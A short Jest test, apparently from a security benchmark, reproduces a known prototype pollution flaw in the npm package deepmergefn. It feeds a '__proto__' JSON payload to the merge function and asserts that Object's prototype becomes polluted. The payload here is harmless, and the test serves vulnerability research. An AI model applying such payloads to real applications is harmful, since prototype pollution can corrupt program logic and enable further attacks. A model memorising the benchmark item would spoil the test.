//https://security.snyk.io/vuln/SNYK-JS-DEEPMERGEFN-1310984
test("prototype pollution in deepmergefn", () => {
  const deepMerge = require("deepmergefn");

  expect({}.polluted).toBe(undefined);

  EVIL_DATA = JSON.parse(process.env.SECBENCH_PAYLOAD || '{"__proto__":{"polluted":"yes"}}');
  deepMerge({}, EVIL_DATA);

  expect({}.polluted).toBe("yes");
});
